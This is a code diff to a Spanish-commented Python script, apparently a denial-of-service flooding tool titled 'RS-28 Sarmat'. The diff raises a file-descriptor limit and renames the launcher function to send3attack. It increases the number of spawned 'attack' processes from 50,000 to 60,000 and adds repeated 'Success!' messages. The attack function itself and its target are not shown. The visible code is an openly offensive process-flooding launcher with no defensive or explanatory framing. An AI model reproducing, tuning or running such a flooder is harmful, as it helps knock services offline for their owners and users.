@@ -11,7 +11,7 @@ print("Sistema detectado: ", sysOS)
 
 if sysOS == "Linux":
   try:
-    os.system("ulimit -n 1030000")
+    os.system("ulimit -n 8450")
   except Exception as e:
     print(e)
     print("No se pudo iniciar el script")
@@ -50,8 +50,8 @@ print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
 
-def send2attack():
-  for i in range(50000): #Poder Mágico
+def send3attack():
+  for i in range(60000): #Poder Mágico
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
@@ -62,5 +62,11 @@ def send2attack():
     print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
     print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
     print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
 
-send2attack()
+send3attack()
